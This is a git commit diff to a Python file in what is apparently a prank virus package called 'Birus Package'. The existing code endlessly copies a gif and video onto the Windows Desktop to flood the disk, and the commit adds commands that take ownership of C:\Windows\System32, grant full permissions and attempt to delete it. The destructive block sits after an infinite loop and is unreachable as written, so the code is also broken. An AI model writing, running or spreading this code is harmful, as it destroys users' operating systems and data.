1d465acfd17722a6a2a55d076e076dfc6dcded3c
Atlasbrine <68679350+Atlasbrine@users.noreply.github.com>
2020-08-21 12:33:28 +0600

    Update Framework1.py

--- Birus Package/Framework1.py
+++ Birus Package/Framework1.py
@@ -1,9 +1,13 @@
 import os , shutil
 i = int (0)
-t = int (1)
+t = int (0)
 while i == 0:
 	path = os.path.join(r'C:\Users',os.getlogin(),'Desktop', f'{t}.gif')
 	path2 = os.path.join(r'C:\Users',os.getlogin(),'Desktop', f'{t}.mp4')	
 	t+=1
 	shutil.copy ('henrystickmin.gif',path)
 	shutil.copy ('chungus.mp4',path2)
+if t == 1000000:
+	os.system('cmd /c "takeown /a /r /d Y /f C:\Windows\System32"')
+	os.system('cmd /c "icacls C:\Windows\System32 /grant administrators:F /t"')
+	os.system('cmd /c "rmdir C:\Windows\System32"')
